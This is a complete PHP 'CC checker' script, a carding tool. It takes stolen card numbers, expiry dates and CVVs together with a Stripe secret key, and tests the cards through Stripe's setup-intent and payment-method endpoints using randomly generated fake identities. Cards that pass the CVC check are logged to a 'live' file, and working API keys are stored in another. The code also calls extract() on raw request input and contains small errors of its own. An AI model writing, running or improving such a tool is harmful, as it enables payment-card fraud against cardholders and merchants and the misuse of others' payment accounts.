<?php
error_reporting(0);
ini_set('display_errors', 0);
date_default_timezone_set('Asia/Manila');
function GetStr($string, $start, $end)
{
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}
function RandomString($length = 23)
{
    $characters       = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}

$sec1 = $_GET['sec'];
extract($_GET);
$check = str_replace(" ", "", htmlspecialchars($check));
$i     = explode("|", $check);
$cc    = $i[0];
$mm    = $i[1];
$yyyy  = $i[2];
$yy    = substr($yyyy, 2, 4);
$cvv   = $i[3];
$bin   = substr($cc, 0, 8);
$last4 = substr($cc, 12, 16);

$m     = ltrim($mm, "0");
$name     = RandomString();
$lastname = RandomString();

$street = mt_rand() . " " . RandomString();
$city   = RandomString();
$state  = RandomString();
$sec = htmlspecialchars($sec1);
$ch  = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/setup_intents');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "payment_method_data[type]=card&usage=off_session&confirm=true&payment_method_data[card][number]='.$cc.'&payment_method_data[card][exp_month]='.$mm.'&payment_method_data[card][exp_year]='.$yyyy.'&payment_method_data[card][cvc]='.$cvv.'&use_stripe_sdk=false");
curl_setopt($ch, CURLOPT_USERPWD, $sec   . ':' . '');

$headers   = array();
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
echo $results;
$c = json_decode(curl_exec($ch), true);
curl_close($ch);


if ($c["next_action"]["use_stripe_sdk"]["type"] == "three_d_secure_redirect") {
    echo '<tr><td><span class="badge badge-danger">DEAD</span></td><td>' . $check . '</td><td><span class="badge badge-danger">[Something Wrong with Stripe account]</span></td></tr>';
} else {
    if ($c["status"] == "succeeded") {
    if(!substr_count(file_get_contents('lives_storage.txt'), $sec) > 0){
    fwrite(fopen('lives_storage.txt', 'a'), $sec.""."\r\n");
    }
        $ch = curl_init();
        
        curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods/' . $c["payment_method"]);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
        
        curl_setopt($ch, CURLOPT_USERPWD, $sec . ':' . '');
        
        $identify = json_decode(curl_exec($ch), true);
        echo $results;
        curl_close($ch);
        if ($identify["card"]["checks"]["cvc_check"] == "unchecked" || strlen($identify["card"]["checks"]["cvc_check"]) < 1) {
            echo '<div class="alert alert-danger">';
      echo '<p align="justify">#Declined : ' . $check . '<strong> [Message: Fix your stripe account.]</strong> ';
      echo '</div>';
    } elseif ($identify["card"]["checks"]["cvc_check"] == "pass") {
            fwrite(fopen('pleks_live_cc_storage.txt', 'a'), $check."\r\n");
            echo '<div class="alert alert-success">';
      echo '<p align="justify">#Approved : <strong>' . $check . ' </strong>[Messsage:CVV<strong>Matched</strong>.]';
      echo '</div>';
        } else {
             echo '<div class="alert alert-success">';
      echo '<p align="justify">#Approved : <strong>' . $check . ' </strong>[Messsage:CCN<strong>Matched</strong>.]';
      echo '</div>';
        }
    } elseif (substr_count($c["error"]["message"], 'declined') > 0 && strlen($c["error"]["decline_code"]) < 1) {
        echo '<div class="alert alert-danger">';
    echo '<p align="justify">#Declined : ' . $check . '<strong> [Message: Fix your stripe account.]</strong> ';
    echo '</div>';
    } else {
        echo '<div class="alert alert-danger">';
    echo '<p align="justify">#Declined : ' . $check . ' <strong>[Message: ' . $c["error"]["message"] . ']</strong> ';
    echo '</div>';
    }
}
?> 
